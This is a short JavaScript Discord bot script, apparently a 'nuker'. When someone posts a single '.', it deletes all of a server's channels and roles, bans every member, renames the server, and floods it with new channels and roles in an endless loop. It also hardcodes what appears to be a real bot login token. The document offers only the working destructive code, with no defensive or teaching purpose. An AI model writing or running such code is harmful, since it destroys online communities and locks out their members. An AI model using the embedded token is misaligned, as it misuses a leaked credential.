const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("XABAR BEJA BLA");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("AZ UP", "text");///////bo channel 
        message.guild.createChannel("JNA SERVE", "voice");////bo voice
        message.guild.createRole({ name: "AZ UP" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODcxODYyOTA5MTEyODQwMjIy.YQhfmw.1b6FrNjHWZ-8E7kOHlTy0WW3oKM")
